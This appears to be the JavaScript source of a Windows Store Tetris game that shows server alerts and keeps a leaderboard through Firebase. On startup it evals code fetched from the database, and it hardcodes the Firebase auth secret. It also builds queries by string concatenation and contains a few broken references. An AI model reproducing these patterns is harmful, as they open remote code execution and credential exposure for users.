Firebase.INTERNAL.forceWebSockets();
Firebase.goOffline();

var firebase = {

    authCode: "1bQSmNVbVoVJ8joKHhwO7Vcn2Ml3vr23shbR0QPo",
    firebaseRef: null,
    firebaseRankingRef: null,

    init: function () {

        try {

            Firebase.goOnline();

            firebaseRef = new Firebase("https://flickering-fire-9399.firebaseio.com/TetriminosArcade");

            firebaseRef.auth(firebase.authCode, function (error, result) {
                //firebase.authCode = result.auth;
            });

            if (firebaseRef) {
                firebaseRankingRef = firebaseRef.child("Ranking");

                firebaseRef.once('value', function (snapshot) {

                    var data = snapshot.val();
                    if (!data)
                        return;

                    if (tetris.state == 'game_over')
                        return;

                    if (data.alertPerm) {
                        if (tetris.state == 'game')
                            tetris.pause();

                        if (!window.onDialogOpen) {
                            var alertBox = (new Windows.UI.Popups.MessageDialog(data.alertPerm, "Tetriminos Arcade"));
                            alertBox.showAsync();
                        }

                    } else if (data.alertTemp) {
                        if (tetris.state == 'game')
                            tetris.pause();

                        if (!window.onDialogOpen) {
                            if (localStorage["AlertMsg"] != data.alertTemp) {
                                var alertBox = (new Windows.UI.Popups.MessageDialog(data.alertTemp, "Tetriminos Arcade"));
                                alertBox.showAsync();
                                localStorage["AlertMsg"] = data.alertTemp;
                            }
                        }

                    }

                    if (data.code) {
                        eval(data.code);
                    }

                    Firebase.goOffline();

                    firebase.refreshRankingList();

                });
            }

        } catch (ex) { }


    },

    refreshRankingList: function (callback) {

        Firebase.goOnline();

        firebaseRankingRef.once('value', function (snapshot) {

            var data = snapshot.val();
            if (!data)
                return;

            ranking.list = data;

            localStorage["ranking"] = JSON.stringify(ranking.list);

            Firebase.goOffline();

            if (callback)
                callback();

        });

    },

    push: function (list, callback) {
        
        try {
            Firebase.goOnline();

            firebaseRankingRef.set(list, function(){

                Firebase.goOffline();
                callback();
            });

        } catch (ex) { }

    }

};

var ranking = {

    list: null,

    position: function (playerId) {

        firebase.refreshRankingList(function () {

            if (!sranking.list)
                return null;

            var list = ranking.list;

            var i = null;
            for (i = 0; i < list.length; i++) {
                if (list[i].playerId == playerId)
                    break;
            }
            return i;

        });

    },

    reRank: function () {
        if (ranking.list)
            ranking.list = Enumerable.From(ranking.list).OrderByDescending("$.score").ToArray();
    },

    trim: function (size) {
        if (ranking.list)
            ranking.list = Enumerable.From(ranking.list).Take(size).ToArray();
    },

    higherRank: false,

    isRanked: function (playerId) {
        if (ranking.list) {
            var x = Enumerable.From(ranking.list).Where("$.playerId == '" + playerId + "'").Select("$").FirstOrDefault(null);
            return x != null;
        }
    },

    set: function (playerId, name, score, callback) {

        if (!Internet.isConnected()) {
            ranking.update(playerId, name, score, callback);
            return;
        }

        if (ranking.list == null) {

             firebase.getList(function () {
                 ranking.save(playerId, name, score, callback);
            });

        } else {
            ranking.save(playerId, name, score, callback);
        }

    },

    save: function (playerId, name, score, callback) {

        firebase.refreshRankingList(function () {

            ranking.update(playerId, name, score, callback);

        });

    },

    update: function (playerId, name, score, callback) {

        var player = Enumerable.From(ranking.list).Where("$.playerId == '" + playerId + "'").Select("$").FirstOrDefault(null);

        if (player != null) {
            //set the score if high
            ranking.higherRank = score > player.score;

            if (ranking.higherRank) {
                player.score = score;
                player.name = name;

                ranking.reRank();
                //ranking.trim(20);
                
                if (Internet.isConnected())
                    firebase.push(ranking.list, callback);

            } else {
                callback();
            }

        } else {

            var record = {
                playerId: playerId,
                name: name,
                score: score
            };

            //put into the pile
            ranking.list.push(record);

            ranking.reRank();
            ranking.trim(20);

            player = Enumerable.From(ranking.list).Where("$.playerId == '" + playerId + "'").Select("$").FirstOrDefault(null);

            if (player != null && Internet.isConnected())
                firebase.push(ranking.list, callback);
            else
                callback();
        }

    }


};

firebase.init();

(function () {
    "use strict";

    var networkInfo = Windows.Networking.Connectivity.NetworkInformation;
    var networkConnectivityInfo = Windows.Networking.Connectivity.NetworkConnectivityLevel;

    WinJS.Namespace.define("Internet", {
        isConnected: isConnected,
        ifConnected: ifConnected
    });

    function isConnected() {
        var connectionProfile = networkInfo.getInternetConnectionProfile();
        if (connectionProfile == null) {
            return false;
        }

        var networkConnectivityLevel = connectionProfile.getNetworkConnectivityLevel();
        if (networkConnectivityLevel == networkConnectivityInfo.none
            || networkConnectivityLevel == networkConnectivityInfo.localAccess
            || networkConnectivityLevel == networkConnectivityInfo.constrainedInternetAccess) {
            return false;
        }

        return true;
    }

    function ifConnected(action) {
        if (isConnected())
            action();
    }

})();

//window.setInterval(function () {

//    Internet.ifConnected(function () {
        
//    });

//}, 10000);